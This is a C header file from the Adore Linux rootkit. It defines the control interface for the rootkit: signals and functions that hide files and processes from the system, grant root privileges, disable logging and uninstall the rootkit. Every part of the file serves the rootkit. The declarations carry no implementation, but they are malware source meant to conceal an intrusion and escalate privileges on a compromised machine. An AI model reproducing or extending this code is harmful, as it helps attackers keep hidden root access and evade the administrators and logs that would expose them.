/*
 * Copyright (C) 1999-2005 Stealth.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Stealth.
 * 4. The name Stealth may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#ifndef _LIBINVISIBLE_H_
#define _LIBINVISIBLE_H_

#include <sys/types.h>

/* Whenever you change this, do so in adore.c!!!
 */
#define SIGINVISIBLE 100
#define SIGVISIBLE   101
#define SIGREMOVE    102

typedef struct adore_t {
	int version;
	/* nothing more yet */
} adore_t;

adore_t *adore_init();

/* adore_t as first argument is something like
 * 'this' in C++.
 * It isn't much used yet, but good for later
 * extensions.
 */
int adore_hidefile(adore_t *, char *);
int adore_unhidefile(adore_t *, char *);

int adore_hideproc(adore_t *, pid_t);
int adore_removeproc(adore_t *, pid_t);
int adore_unhideproc(adore_t *, pid_t);

int adore_makeroot(adore_t *);
int adore_free(adore_t *);
int adore_getvers(adore_t *);
int adore_free(adore_t *);

int adore_disable_logging(adore_t *);
int adore_enable_logging(adore_t *);

int adore_uninstall(adore_t *);

#endif

